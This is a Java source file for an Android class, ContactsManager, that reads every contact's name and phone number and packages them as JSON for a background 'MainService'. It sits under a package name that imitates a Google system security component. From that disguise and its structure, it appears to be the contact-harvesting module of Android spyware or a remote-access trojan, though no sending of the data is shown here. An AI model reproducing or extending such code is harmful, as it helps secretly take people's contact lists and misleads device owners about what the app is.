package com.google.android.sys.security;

import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by sys_security on 11/11/16.
 */

public class ContactsManager {

    public static JSONObject getContacts(){
        Cursor cur = null;
        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            
            cur = MainService.getContextOfApplication().getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] { 
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, 
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                }, 
                null, 
                null,  
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cur != null) {
                while (cur.moveToNext()) {
                    try {
                        JSONObject contact = new JSONObject();
                        
                        int nameIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                        int numIndex = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        
                        if (nameIndex >= 0 && numIndex >= 0) {
                            String name = cur.getString(nameIndex);
                            String num = cur.getString(numIndex);

                            contact.put("phoneNo", num != null ? num : "Unknown");
                            contact.put("name", name != null ? name : "Unknown");
                            list.put(contact);
                        }
                    } catch (Exception e) {
                        // Skip this contact if error, continue with others
                        Log.e("ContactsManager", "Error reading individual contact", e);
                    }
                }
            }
            
            contacts.put("contactsList", list);
            Log.d("ContactsManager", "Collected " + list.length() + " contacts");
            return contacts;
            
        } catch (Exception e) {
            Log.e("ContactsManager", "Error reading contacts", e);
            return null;
        } finally {
            // Always close cursor to prevent memory leak
            if (cur != null) {
                try {
                    cur.close();
                } catch (Exception e) {
                    Log.e("ContactsManager", "Error closing cursor", e);
                }
            }
        }
    }

}
